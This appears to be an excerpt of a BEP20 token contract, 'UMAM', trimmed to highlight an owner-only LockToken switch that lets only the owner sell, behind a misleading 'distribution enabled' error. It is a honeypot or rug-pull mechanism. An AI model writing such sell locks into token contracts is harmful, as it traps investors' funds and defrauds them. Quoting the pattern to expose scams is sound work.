...
contract UMAM is IBEP20, Auth {
    ...
    address public autoLiquidityReceiver=0x812b265a6bB7bf4CFe888Ae43C3324d8545A0F5d;
    address public marketingFeeReceiver=0x812b265a6bB7bf4CFe888Ae43C3324d8545A0F5d;
    ...
    function LockToken(bool value) external onlyOwner {
        LockedToken = value;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!LockedToken || sender==owner), "distribution enabled");
